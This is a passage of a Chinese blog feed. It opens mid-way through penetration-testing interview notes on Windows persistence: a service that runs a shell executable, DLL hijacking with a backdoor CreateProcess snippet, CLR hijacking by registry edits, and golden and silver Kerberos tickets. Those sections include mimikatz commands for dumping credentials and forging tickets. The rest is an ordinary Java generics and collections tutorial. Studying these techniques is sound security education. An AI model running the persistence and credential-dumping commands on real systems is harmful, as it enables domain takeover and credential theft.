binpath= c:\shell.exe      (注意等号后面有空格) #创建服务sc config test start= auto                #设置服务为自动启动net start test                            #启动服务</code></pre></li><li>黄金白银票据</li><li>DLL劫持</li></ol><pre><code>dll加载顺序:Windows xp sp2之前：1. 进程对应的应用程序所在目录；2. 当前目录（Current Directory）；3. 系统目录（通过 GetSystemDirectory 获取）；4. 16位系统目录；5. Windows目录（通过 GetWindowsDirectory 获取）；6. PATH环境变量中的各个目录；Windows xp sp2之后：Windows查找DLL的目录以及对应的顺序（SafeDllSearchMode 默认会被开启）：默认注册表为：HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode，其键值为11. 进程对应的应用程序所在目录（可理解为程序安装目录比如C:\ProgramFiles\uTorrent）2. 系统目录（即%windir%system32）；3. 16位系统目录（即%windir%system）；4. Windows目录（即%windir%）；5. 当前目录（运行的某个文件所在目录，比如C:\Documents and Settings\Administrator\Desktop\test）；6. PATH环境变量中的各个目录；win7以上版本：系统没有了SafeDllSearchMode 而采用KnownDLLs，那么凡是此项下的DLL文件就会被禁止从exe自身所在的目录下调用，而只能从系统目录即SYSTEM32目录下调用，其注册表位置：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs劫持流程：1. 使用ahaeadlib将源dll文件转为cpp文件2. 使用visual studio打开cpp文件插入要执行的后门代码，并生成新的dll文件STARTUPINFO si = &#123; sizeof(si) &#125;;PROCESS_INFORMATION pi;CreateProcess(TEXT(&quot;C:\\shell.exe&quot;), NULL, NULL, NULL, false, 0, NULL, NULL, &amp;si, &amp;pi);</code></pre><ol start="10"><li>CLR劫持</li></ol><pre><code>CLR称公共语言运行时。CLR是.NETFramework的主要执行引擎，作用之一是监视程序的运行。可以理解成，让系统在执行.NET程序的时候先执行一个你指定的dll文件。1.修改注册表：REG ADD &quot;HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;11111111-1234-1234-1234-111111111111&#125;\InProcServer32&quot; /VE /T REG_SZ /D &quot;C:\test.dll&quot; /FREG ADD &quot;HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;11111111-1234-1234-1234-111111111111&#125;\InProcServer32&quot; /V ThreadingModel /T REG_SZ /D Apartment /F 2.配置全局环境变量（不然只在当前cmd窗口劫持.net程序）SETX COR_ENABLE_PROFILING 1 /MSETX COR_PROFILER &#123;11111111-1234-1234-1234-111111111111&#125; /M3.然后直接执行powershell即可上线。</code></pre><h3 id="黄金白银票据"><a href="#黄金白银票据" class="headerlink" title="黄金白银票据"></a>黄金白银票据</h3><p>  Kerberos认证的大概流程：<br>  当 Client 想要访问 Server 上的某个服务时,需要先向 AS 证明自己的身份,验证通过后AS会发放的一个TGT,随后Client再次向TGS证明自己的身份,验证通过后TGS会发放一个ST,最后Client向 Server 发起认证请求,这个过程分为三块：<br>  <strong>Client 与 AS 的交互,<br>  Client 与 TGS 的交互,<br>  Client 与 Server 的交互。<br>黄金票据是伪造TGT，白银票据则是伪造ST</strong><br><a href="https://smms.app/image/vu6ATBZc7i4e1tR" target="_blank"><img src="https://s2.loli.net/2024/03/20/vu6ATBZc7i4e1tR.png" alt="Kerberos认证的大概流程.png"></a></p><h4 id="黄金票据（Golden-Ticket）"><a href="#黄金票据（Golden-Ticket）" class="headerlink" title="黄金票据（Golden Ticket）"></a>黄金票据（Golden Ticket）</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>  <strong>黄金票据就是伪造krbtgt用户的TGT票据，krbtgt用户是域控中用来管理发放票据的用户，拥有了该用户的权限，就可以伪造系统中的任意用户</strong></p><h5 id="利用前提："><a href="#利用前提：" class="headerlink" title="利用前提："></a>利用前提：</h5><ul><li>拿到域控(没错就是拿到域控QAQ),适合做权限维持</li><li>有krbtgt用户的hash值(aeshash ntlmhash等都可以,后面指定一下算法就行了)</li></ul><h5 id="条件要求："><a href="#条件要求：" class="headerlink" title="条件要求："></a>条件要求：</h5><ul><li>域名<pre><code>whoaminet time /domainipconfig /all</code></pre></li><li>域的SID 值<pre><code>whoami /all</code></pre></li><li>域的KRBTGT账户NTLM密码哈希<pre><code>使用mimikatzlsadump::dcsync /domain:zz.com /user:krbtgt /csv</code></pre></li><li>伪造用户名<pre><code>net group &quot;domain admins&quot;</code></pre></li></ul><h5 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h5><ul><li>限制域管理员登录到除域控制器和少数管理服务器以外的任何其他计算机,将所有其他权限委派给自定义管理员组。</li><li>禁用KRBTGT帐户，并保存当前的密码以及以前的密码。</li><li>建议定期更改KRBTGT密码，然后让AD备份，并在12到24小时后再次更改它。这个过程应该对系统环境没有影响。</li><li>通过快速更改KRBTGT密码两次，使任何现有的黄金票据（以及所有活动的Kerberos票据）失效。</li></ul><h4 id="白银票据（Silver-Ticket）"><a href="#白银票据（Silver-Ticket）" class="headerlink" title="白银票据（Silver Ticket）"></a>白银票据（Silver Ticket）</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><p>  <strong>黄金票据是伪造TGT（门票发放票），而白银票据则是伪造ST（门票），这样的好处是门票不会经过KDC，从而更加隐蔽，但是伪造的门票只对部分服务起作用,如cifs（文件共享服务），mssql，winrm（windows远程管理），DNS等等</strong></p><h5 id="利用前提：-1"><a href="#利用前提：-1" class="headerlink" title="利用前提："></a>利用前提：</h5><ul><li>拿到目标机器hash(是目标机,不一定是域控)</li></ul><h5 id="条件要求：-1"><a href="#条件要求：-1" class="headerlink" title="条件要求："></a>条件要求：</h5><ul><li>域名<pre><code>whoaminet time /domainipconfig /all</code></pre></li><li>域的SID 值<pre><code>whoami /all</code></pre></li><li>目标服务器FQDN<pre><code>net time /domain  就是hostname+域名 /target:\\WIN-75NA0949GFB.NOONE.com</code></pre></li><li>可利用的服务<pre><code>/service:CIFS  </code></pre></li><li>服务账号的NTML HASH<pre><code>/rc4:08d93ddf15a6309a46daaa7ec8565296#生成了mimikatz.log文件(域控主机执行)服务账号就是域控名$mimikatz.exe privilege::debug sekurlsa::logonpasswords exit &gt;&gt; 2.txt</code></pre></li><li>需要伪造的用户名<pre><code>/user:Administrator</code></pre></li><li>清除其它票据<pre><code>klist purge</code></pre></li><li>使用mimikatz伪造票据注入内存<pre><code>kerberos::golden /domain:域名 /sid:填sid /target:完整的域控名 /service:cifs /rc4:服务账号NTMLHASH /user:用户名 /ptt</code></pre></li></ul><h4 id="两者区别"><a href="#两者区别" class="headerlink" title="两者区别"></a>两者区别</h4><h5 id="获取的权限不同"><a href="#获取的权限不同" class="headerlink" title="获取的权限不同"></a>获取的权限不同</h5><p>  金票：伪造的由域控生成的针对所有机器的所有服务的TGT，可以获取任意Kerberos的访问权限<br>  银票：伪造的普通域用户的身份生成的ST，只能访问指定的服务，如CIFS</p><h5 id="认证流程不同"><a href="#认证流程不同" class="headerlink" title="认证流程不同"></a>认证流程不同</h5><p>  金票：同KDC交互，但不同AS交互<br>  银票：不同KDC交互，直接访问Server</p><h5 id="加密方式不同"><a href="#加密方式不同" class="headerlink" title="加密方式不同"></a>加密方式不同</h5><p>  金票：由krbtgt NTLM Hash 加密<br>  银票：由服务账号 NTLM Hash 加密</p><h5 id="产生日志与否"><a href="#产生日志与否" class="headerlink" title="产生日志与否"></a>产生日志与否</h5><p>  Golden Ticket会在域控中留下日志<br>  Silver Ticket 仅在目标系统留下日志<br><strong>（因为Silver Ticket 不与KDC产生交互）</strong></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>  这篇文章算是今年第一期面试题吧，后面会持续更新的。<br>  希望今年能够从这一些面试题中提升更多！<br>  <a href="https://smms.app/image/6pRVq7fA28WLy1C" target="_blank"><img src="https://s2.loli.net/2024/03/20/6pRVq7fA28WLy1C.jpg" width="300px"></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;SQLMAP-os-shell原理&quot;&gt;&lt;a href=&quot;#SQLMAP-os-shell原理&quot; class=&quot;headerlink&quot; title=&quot;SQLMAP os-shell原理&quot;&gt;&lt;/a&gt;SQLMAP os-shell原理&lt;/h2&gt;&lt;p&gt;  当数据库为MyS</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Java容器</title>
    <link href="https://liu1272.github.io/2023/12/20/Java%E5%AE%B9%E5%99%A8/"/>
    <id>https://liu1272.github.io/2023/12/20/Java%E5%AE%B9%E5%99%A8/</id>
    <published>2023-12-20T12:04:00.000Z</published>
    <updated>2023-12-20T18:24:23.127Z</updated>
    
    <content type="html"><![CDATA[<h2 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h2><h4 id="泛型概念"><a href="#泛型概念" class="headerlink" title="泛型概念"></a>泛型概念</h4><p>  泛型的本质就是“数据类型的参数化”处理的数据类型不是固定的，而是可以作为参数传入，在调用泛型时必须传入实际类型。</p><ol><li>把类型当作是参数一样传递</li><li>&lt;数据类型&gt;只能是引用类型</li><li>泛型只在编译阶段有效，编译后生成的字节码 class 文件不包含泛型中的类型信息（类型参数在编译后会被替换成 object，运行时虚拟机并不知道泛型。）</li></ol><h4 id="泛型定义"><a href="#泛型定义" class="headerlink" title="泛型定义"></a>泛型定义</h4><table><thead><tr><th>泛型</th><th>对应单词</th><th>说明</th></tr></thead><tbody><tr><td>E</td><td>Element</td><td>在容器中使用，表示容器中的元素</td></tr><tr><td>T</td><td>Type</td><td>表示普通的JAVA类</td></tr><tr><td>K</td><td>Key</td><td>表示键，例如: Map 中的键 Key</td></tr><tr><td>V</td><td>Value</td><td>表示值</td></tr><tr><td>N</td><td>Number</td><td>表示数值类型</td></tr><tr><td>?</td><td></td><td>表示不确定的JAVA类型</td></tr></tbody></table><h4 id="非静态方法泛型"><a href="#非静态方法泛型" class="headerlink" title="非静态方法泛型"></a>非静态方法泛型</h4><pre class="line-numbers language-Java"><code class="language-Java">// 定义一个泛型方法public class GenericMethods &#123;    public <T> void f(T x) &#123;        ......    &#125;&#125;// 定义一个泛型类// 这里T可以随便写为任意标识，但是实例化泛型类时必须指定T的具体类型public interface Dao<T> &#123;    void add(T t);    T get(int index);&#125;// 定义一个泛型接口// 未传入泛型实参时，T与泛型类的定义相同，在声明类的时候，需将泛型的声明也一起加到类中// 传入泛型实参时，所有使用泛型的地方都要替换成传入的实参类型public interface Generator<T> &#123;    public T next();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>泛型的类型参数只能是类类型，不能是简单类型。</li><li>不能对确切的泛型类型使用instanceof操作。如下面的操作是非法的，编译时会出错。<br><code>if(ex_num instanceof Generic&lt;Number&gt;)&#123; &#125; </code></li></ul><h4 id="静态方法泛型"><a href="#静态方法泛型" class="headerlink" title="静态方法泛型"></a>静态方法泛型</h4><pre class="line-numbers language-Java"><code class="language-Java">// 定义一个静态方法的泛型类public class StaticGenerator<T> &#123;     * 如果在类中定义使用泛型的静态方法，需要添加额外的泛型声明（将这个方法定义成泛型方法）    public static <T> void show(T t)&#123;        ......    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="泛型数组"><a href="#泛型数组" class="headerlink" title="泛型数组"></a>泛型数组</h4><p>  java中是”不能创建一个确切的泛型类型的数组”的。</p><pre class="line-numbers language-Java"><code class="language-Java">不可以：List<String>[] ls = new ArrayList<String>[10];  可以：List<?>[] ls = new ArrayList<?>[10]; List<String>[] ls = new ArrayList[10];对于通配符的方式，最后取出数据是要做显式的类型转换的。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="无界通配符"><a href="#无界通配符" class="headerlink" title="无界通配符"></a>无界通配符</h4><p>  当具体类型不确定的时候，这个通配符就是<code>?</code> ；当操作类型时，不需要使用类型的具体功能时，只使用Object类中的功能。那么可以用<code>?</code>通配符来表未知类型。<br>  <strong>上限限定</strong>表示通配符的类型是T类以及T类的子类或者T接口以及T接口的子接口。</p><pre class="line-numbers language-Java"><code class="language-Java">public void showKeyValue1(Generic<? extends Number> obj)&#123;    // 表示只能使用Number及其子类    ......&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <strong>下限限定</strong>表示通配符的类型是 T 类以及 T类的父类或者 T 接口以及 T接口的父接口<br>注意:该方法不适用泛型类</p><pre class="line-numbers language-Java"><code class="language-Java">public void showKeyValue1(Generic<? super Number> obj)&#123;    // 表示只能使用Number及其父类    ......&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><h3 id="容器的概念"><a href="#容器的概念" class="headerlink" title="容器的概念"></a>容器的概念</h3><p>  容器是存储存储对象和数据的载体，数组是其中之一，使用Java中写好的容器API我们可以很方便的存储、操作我们的数据。</p><h3 id="容器的分类"><a href="#容器的分类" class="headerlink" title="容器的分类"></a>容器的分类</h3><p><a href="https://smms.app/image/J6sWdwRzbqQElkn" target="_blank"><img src="https://s2.loli.net/2023/12/20/J6sWdwRzbqQElkn.jpg" ></a><br>  Collection：存放独立元素的序列。<br>  Map：存放key-value型的元素对。（这对于需要利用key查找value的程序十分的重要！）</p><p>  <em>Collection是一个接口，它是Set、List等容器的父接口；Collections是个一个工具类，提供了一系列的静态方法来辅助容器操作，这些方法包括对容器的搜索、排序、线程安全化等等。</em></p><h4 id="【List】"><a href="#【List】" class="headerlink" title="【List】"></a>【List】</h4><p>  <strong>有序</strong>: 元素<strong>存入集合的顺序和取出的顺序一致</strong>，可以根据元素的索引标记访问元素<br>  <strong>可重复</strong>:  List <strong>允许加入重复的元素</strong>。<br>  List主要分为ArrayList和LinkedList，前者底层是使用数组实现的List，后者是使用链表实现的List。<br>  Vector是一个已经被弃用的类，因为他是线程同步的，会导致访问速度变慢。<br>  Stack是满足“后进先出”规则的容器，然而LinkedList可以实现所有的栈功能。</p><h4 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h4><p>  ArrayList是一个<strong>可以动态增长</strong>的数组。<br>  ArrayList默认的长度是10，如果我们插入的数据超过了10，ArrayList会不断的自我增长。<br>  ArrayList扩容的本质就是计算出新的扩容数组的size后实例化，并将原有数组内容复制到新数组中去。默认情况下，新的容量会是原容量的1.5倍。<br>  ArrayList由于底层是<strong>使用数组实现</strong>的，所以随机访问速度快，插入删除较慢，而且线程不安全。</p><table><thead><tr><th>方法</th><th>解释</th></tr></thead><tbody><tr><td>add(1, “C#”)</td><td>添加单个元素</td></tr><tr><td>get()</td><td>指定位置的元素</td></tr><tr><td>size()</td><td>列表的大小</td></tr><tr><td>List.copy()</td><td>生成列表的副本</td></tr><tr><td>toArray()</td><td>把LinkedList转化为Array</td></tr><tr><td>addAll(2, colours2)</td><td>添加多个元素</td></tr><tr><td>set(3, “watch”)</td><td>修改第n个元素</td></tr><tr><td>remove()</td><td>删除索引为 0 的第一个元素</td></tr><tr><td>重载的remove(pen)</td><td>删除“ pen”项的第一次出现</td></tr><tr><td>clear()</td><td>从列表中删除所有元素</td></tr><tr><td>isEmpty()</td><td>确定列表是否为空</td></tr><tr><td>contains()</td><td>是否包含该元素</td></tr><tr><td>indexOf()</td><td>返回首次出现的索引</td></tr><tr><td>sort()</td><td>进行排序，可自定义</td></tr></tbody></table><h4 id="LinkedList"><a href="#LinkedList" class="headerlink" title="LinkedList"></a>LinkedList</h4><p>  LinkedList是一种线性表（链表），但是并<strong>不会按线性的顺序存储数据</strong>，而是在每一个节点里存到下一个节点的地址。<br>  链表可分为单向链表和双向链表。<br>  在列表中插入和删除速度快，但是查找需要遍历整个链表速度较慢。<br>  使用LinkedList可以实现很多队列、栈的数据结构。</p><table><thead><tr><th>方法</th><th>解释</th></tr></thead><tbody><tr><td>add(E e)</td><td>链表末尾添加元素</td></tr><tr><td>add(int index, E element)</td><td>向指定位置插入元素。</td></tr><tr><td>addAll(Collection c)</td><td>将一个集合的所有元素添加到链表后面</td></tr><tr><td>addAll(int index, Collection c)</td><td>将一个集合的所有元素添加到链表的指定位置后面</td></tr><tr><td>addFirst(E e)</td><td>元素添加到头部。</td></tr><tr><td>addLast(E e)</td><td>元素添加到尾部。</td></tr><tr><td>offer(E e)</td><td>向链表末尾添加元素</td></tr><tr><td>offerFirst(E e)</td><td>头部插入元素</td></tr><tr><td>offerLast(E e)</td><td>尾部插入元素</td></tr><tr><td>clear()</td><td>清空链表。</td></tr><tr><td>removeFirst()</td><td>删除并返回第一个元素。</td></tr><tr><td>removeLast()</td><td>删除并返回最后一个元素。</td></tr><tr><td>remove(Object o)</td><td>删除某一元素</td></tr><tr><td>remove(int index)</td><td>删除指定位置的元素。</td></tr><tr><td>poll()</td><td>删除并返回第一个元素。</td></tr><tr><td>remove()</td><td>删除并返回第一个元素。</td></tr><tr><td>contains(Object o)</td><td>判断是否含有某一元素。</td></tr><tr><td>get(int index)</td><td>返回指定位置的元素。</td></tr><tr><td>getFirst()</td><td>返回第一个元素。</td></tr><tr><td>getLast()</td><td>返回最后一个元素。</td></tr><tr><td>indexOf(Object o)</td><td>查找指定元素从前往后第一次出现的索引。</td></tr><tr><td>lastIndexOf(Object o)</td><td>查找指定元素最后一次出现的索引。</td></tr><tr><td>peek()</td><td>返回第一个元素。</td></tr><tr><td>element()</td><td>返回第一个元素。</td></tr><tr><td>peekFirst()</td><td>返回头部元素。</td></tr><tr><td>peekLast()</td><td>返回尾部元素。</td></tr><tr><td>set(int index, E element)</td><td>设置指定位置的元素。</td></tr><tr><td>clone()</td><td>克隆该列表。</td></tr><tr><td>descendingIterator()</td><td>返回倒序迭代器。</td></tr><tr><td>size()</td><td>返回链表元素个数。</td></tr><tr><td>listIterator(int index)</td><td>返回从指定位置开始到末尾的迭代器。</td></tr><tr><td>toArray(T[] a)</td><td>返回一个由链表元素转换类型而成的数组。</td></tr></tbody></table><pre><code>getFirst和element都返回列表的头，但是不删除它，如果列表为空，抛出异常peek实现的功能一样，但是列表为空时返回nullremoveFirst和remove都是删除并返回列表的头，如果列表为空抛出异常pool实现的功能一样，但是列表为空时返回null</code></pre><h4 id="Queue"><a href="#Queue" class="headerlink" title="Queue"></a>Queue</h4><p>  队列Queue是一个满足“先进先出”的数据结构。<br>  队列是一种特殊的线性表，它<strong>只允许在表的前端进行删除操作，而在表的后端进行插入操作</strong>。<br>  LinkedList类实现了Queue接口，因此我们可以把LinkedList当成Queue来用。<br>  LinkedList提供了方法支持队列操作，并且实现了Queue接口，所以LinkedList是队列的一种实现，可以通过LinkedList向上转型为Queue</p><pre><code>offer:将一个元素插入对尾peek:不移除的情况下将元素插入队尾，队列为空返回nullelement:不移除的情况下将元素插入队尾，队列为空报错poll:移除并返回队头，队列为空返回nullremove:不移除的情况下将元素插入队尾，队列为空报错offer，add 区别：一些队列会因为有大小限制而在插入时被拒绝。这时它不是对调用 add() 方法抛出一个 unchecked 异常，而只是得到由 offer() 返回的 false。poll，remove 区别：remove() 和 poll() 方法都是从队列中删除第一个元素。poll() 方法在用空集合调用时不是抛出异常，只是返回 null。peek，element区别：element() 和 peek() 用于在队列的头部查询元素。element() 抛出一个异常，而 peek() 返回 null。</code></pre><h4 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h4><p>  PriorityQueue类提供堆数据结构的功能。<br>  优先队列元素是<strong>按排序顺序检索</strong>的。<br>  假设我们想以升序检索元素。在这种情况下，优先队列的头是最小的元素。检索到该元素后，下一个最小的元素将成为队列的头。<br>  优先队列的元素可能没有排序。但是元素总是按排序顺序检索的。<br><a href="https://smms.app/image/4oRSTwb98gnPM5y" target="_blank"><img src="https://s2.loli.net/2023/12/21/4oRSTwb98gnPM5y.jpg" width="300"></a><br>PriorityQueue方法与Queue基本相同。</p><h4 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h4><p>  底层是<strong>用数组实现</strong>的，相关的方法都加了同步检查，因此<strong>“线程安全,效率低“</strong>比如indexof方法就增加了 synchronized 同步标记。<br>  Vector 类实现了一个<strong>动态数组</strong>。和 ArrayList 很相似，但是两者是不同的：<br>  Vector 包含了许多传统的方法，这些方法不属于集合框架，而且它是同步访问的。<br>  Vector 主要用在事先不知道数组的大小，或者只是需要一个可以改变大小的数组的情况。 </p><h4 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h4><p>  栈是Vector的一个子类，它实现了一个标准的后进先出的栈。<br>  堆栈只定义了默认构造函数，用来创建一个空栈。堆栈除了包括由Vector定义的所有方法，也定义了自己的一些方法。</p><table><thead><tr><th>外加方法</th><th>解释</th></tr></thead><tbody><tr><td>empty()</td><td>测试堆栈是否为空。</td></tr><tr><td>peek()</td><td>查看堆栈顶部的对象，但不从堆栈中移除它。</td></tr><tr><td>pop()</td><td>移除堆栈顶部的对象，并作为此函数的值返回该对象。</td></tr><tr><td>push(Object element)</td><td>把项压入堆栈顶部。</td></tr><tr><td>search(Object element)</td><td>返回对象在堆栈中的位置，以 1 为基数。</td></tr></tbody></table><h4 id="【Set】"><a href="#【Set】" class="headerlink" title="【Set】"></a>【Set】</h4><p>  Collections框架的Set接口提供Java中数学集合的功能。它继承了Collection接口。<br>  与List接口不同，Set集合<strong>不能包含重复的元素</strong>，而且由于Set是接口，因此无法从中创建对象。</p><ul><li>HashSet</li><li>LinkedHashSet</li><li>EnumSet</li><li>TreeSet<br>以上类在Collections框架中定义并实现Set接口。</li></ul><table><thead><tr><th>方法</th><th>解释</th></tr></thead><tbody><tr><td>add()</td><td>将指定的元素添加到集合中</td></tr><tr><td>addAll()</td><td>将指定集合的所有元素添加到集合中</td></tr><tr><td>iterator()</td><td>返回一个迭代器，该迭代器可用于顺序访问集合中的元素</td></tr><tr><td>remove()</td><td>从集合中移除指定的元素</td></tr><tr><td>removeAll()</td><td>从存在于另一个指定集合中的集合中删除所有元素</td></tr><tr><td>keepAll()</td><td>保留集合中所有还存在于另一个指定集合中的所有元素</td></tr><tr><td>clear()</td><td>从集合中删除所有元素</td></tr><tr><td>size()</td><td>返回集合的长度（元素数）</td></tr><tr><td>toArray()</td><td>返回包含集合中所有元素的数组</td></tr><tr><td>contains()</td><td>如果集合包含指定的元素，则返回true</td></tr><tr><td>containsAll()</td><td>如果集合包含指定集合的所有元素，则返回true</td></tr><tr><td>hashCode()</td><td>返回哈希码值（集合中元素的地址）</td></tr><tr><td>Union</td><td>为了得到两个集合x和y的并集，我们可以使用x.addAll(y)</td></tr><tr><td>Intersection</td><td>要获得两个集合x和y的交集，我们可以使用x.retainAll(y)</td></tr><tr><td>Subset</td><td>要检查x是否是y的子集，我们可以使用y.containsAll(x)</td></tr></tbody></table><h4 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h4><p>  HashSet 基于 HashMap 来实现的，是一个<strong>无序</strong>（底层使用的是数组与链表实现，对元素的哈希值进行运算决定元素在数组中的位置）、<strong>线程不安全</strong>、<strong>不允许有重复元素</strong>（元素哈希计算后使用equals判断是否相同）的集合。<br>  HashSet 允许有 null 值。<br>  HashSet 是无序的，即不会记录插入的顺序。<br>  HashSet 不是线程安全的， 如果多个线程尝试同时修改 HashSet，则最终结果是不确定的。<br>  方法与Set接口提供的方法相同。</p><h4 id="TreeSet"><a href="#TreeSet" class="headerlink" title="TreeSet"></a>TreeSet</h4><p>  TreeSet 是一个<strong>可以对元素进行排序</strong>的容器。<br>  <strong>底层实际是用 TreeMap 实现的</strong>，内部维持了一个简化版的 TreeMap，通过 key 来存储 Set 的元素。<br>对元素排序规则的实现方式:</p><ol><li>通过元素自身实现比较规则。</li><li>通过比较器指定比较规则。</li></ol><table><thead><tr><th>方法</th><th>解释</th></tr></thead><tbody><tr><td>clone()</td><td>创建TreeSet的副本</td></tr><tr><td>contains()</td><td>在TreeSet中搜索指定的元素并返回布尔结果</td></tr><tr><td>isEmpty()</td><td>检查是否TreeSet为空</td></tr><tr><td>size()</td><td>返回TreeSet的大小</td></tr><tr><td>clear()</td><td>从TreeSet中删除所有元素</td></tr></tbody></table><h4 id="【Map】"><a href="#【Map】" class="headerlink" title="【Map】"></a>【Map】</h4><p>  Map（也称为字典、关联数组）是用于保存具有映射关系的数据，保存两组值，key和value，这两组值可以是任何应用类型的数据。<br>  Map的key不允许重复<strong>（底层Map的keySet()返回的是key的Set集合，所以key不会重复）</strong>而value值是可以重复的<strong>（Map的底层values()方法返回类型是Collection，可以存储重复元素）</strong>。</p><table><thead><tr><th>方法</th><th>解释</th></tr></thead><tbody><tr><td>getKey()</td><td>获取Entry中的key值</td></tr><tr><td>getValue()</td><td>获取Entry中的value值</td></tr><tr><td>setValue(V value)</td><td>设置Entry中的value值，并返回新设置的value值</td></tr><tr><td>size()</td><td>返回Map的key-value对的长度。</td></tr><tr><td>isEmpty()</td><td>判断该Map是否为空。</td></tr><tr><td>containsKey(Object key)</td><td>判断该Map中是否包含指定的key。</td></tr><tr><td>containsValue(Object value)</td><td>判断该Map是否包含一个或多个value。</td></tr><tr><td>get(Object key)</td><td>获取某个key所对应的value；若不包含该key，则返回null。</td></tr><tr><td>put(K key, V value)</td><td>向Map添加key-value对，当Map中有一个与该key相等的key-value对，则新的会去覆盖旧的。</td></tr><tr><td>remove(Object key)</td><td>移除指定的key所对应的key-value对，若成功删除，则返回移除的value值。</td></tr><tr><td>putAll(Map&lt;? extends K, ? extends V&gt; m)</td><td>将指定的Map中的key-value对全部复制到该Map中。</td></tr><tr><td>clear()</td><td>清除Map中的所有key-value对。</td></tr><tr><td>keySet()</td><td>获取该Map中所有key组成的Set集合。</td></tr><tr><td>values()</td><td>获取该Map中所有value组成的Collection。</td></tr><tr><td>entrySet()</td><td>返回该Map中Entry类的Set集合。</td></tr><tr><td>remove(Object key, Object value)</td><td>删除指定的key-value对，若删除成功，则返回true；否则，返回false。</td></tr></tbody></table><h4 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h4><p>  HashMap 是一个散列表，它存储的内容是键值对(key-value)映射。<br>  HashMap 是无序的、不支持线程同步的、访问速度很快的、根据键 HashCode 值存储数据的，数组和链表的结合体。<br>  当新建一个HashMap的时候，就会初始化一个数组。数组是Entry[]数组，静态内部类。Entry就是数组中的元素，每个 Map.Entry 其实就是一个key-value对，它持有一个指向下一个元素的引用next，这就构成了链表。<br>  HashMap 的 key 与 value 类型可以相同也可以不同，因为HashMap 中的元素实际上是对象。可以使用null作为key或value。</p><table><thead><tr><th>方法</th><th>解释</th></tr></thead><tbody><tr><td>clear()</td><td>删除hashMap中的所有键/值对。</td></tr><tr><td>clone()</td><td>复制一份hashMap。</td></tr><tr><td>isEmpty()</td><td>判断hashMap是否为空。</td></tr><tr><td>size()</td><td>计算hashMap中键/值对的数量。</td></tr><tr><td>put()</td><td>将键/值对添加到hashMap中。</td></tr><tr><td>putAll()</td><td>将所有键/值对添加到hashMap中。</td></tr><tr><td>putIfAbsent()</td><td>如果hashMap中不存在指定的键，则将指定的键/值对插入到hashMap中。</td></tr><tr><td>remove()</td><td>删除hashMap中指定键key的映射关系。</td></tr><tr><td>containsKey()</td><td>检查hashMap中是否存在指定的key对应的映射关系。</td></tr><tr><td>containsValue()</td><td>检查hashMap中是否存在指定的value对应的映射关系。</td></tr><tr><td>replace()</td><td>替换hashMap中指定的key对应的value。</td></tr><tr><td>replaceAll()</td><td>将hashMap中的所有映射关系替换成给定的函数所执行的结果。</td></tr><tr><td>get()</td><td>获取指定key对应的value。</td></tr><tr><td>getOrDefault()</td><td>获取指定key对应的value，如果找不到key，则返回设置的默认值。</td></tr><tr><td>forEach()</td><td>对hashMap中的每个映射执行指定的操作。</td></tr><tr><td>entrySet()</td><td>返回hashMap中所有映射项的集合视图。</td></tr><tr><td>keySet()</td><td>返回hashMap中所有key组成的集合视图。</td></tr><tr><td>values()</td><td>返回hashMap中存在的所有value值。</td></tr><tr><td>merge()</td><td>添加键值对到hashMap中。</td></tr><tr><td>compute()</td><td>对hashMap中指定key的值进行重新计算。</td></tr><tr><td>computeIfAbsent()</td><td>对hashMap中指定key的值进行重新计算，如果不存在这个key，则添加到hashMap中。</td></tr><tr><td>computeIfPresent()</td><td>对hashMap中指定key的值进行重新计算，前提是该key存在于hashMap中。</td></tr></tbody></table><h4 id="TreeMap"><a href="#TreeMap" class="headerlink" title="TreeMap"></a>TreeMap</h4><p>  与TreeSet非常相似。<br>  能够把它保存的记录根据键(key)排序,默认是按升序排序，也可以指定排序的比较器，当用Iterator 遍历TreeMap时，得到的记录是排过序的。<br>  TreeMap不允许key的值为null，value允许为null。<br>  底层是红黑树数据结构，每个key-value作为红黑树的一个节点。TreeMap存储节点时，根据key对节点进行排序，主要是自然排序和自定义排序。类似于TreeSet。</p><h4 id="Hashtable"><a href="#Hashtable" class="headerlink" title="Hashtable"></a>Hashtable</h4><p>  与HashMap类似，但key和value的值均不允许为null;它支持线程的同步（线程安全），也导致了Hashtale在写入时会比较慢。 </p><h4 id="LinkedHashMap"><a href="#LinkedHashMap" class="headerlink" title="LinkedHashMap"></a>LinkedHashMap</h4><p>  LinkedHashMap是HashMap的子类，使用双向链表维护key-value对的顺序（只是关注key的顺序），迭代顺序和key-value插入Map中的顺序保持一致。<br>  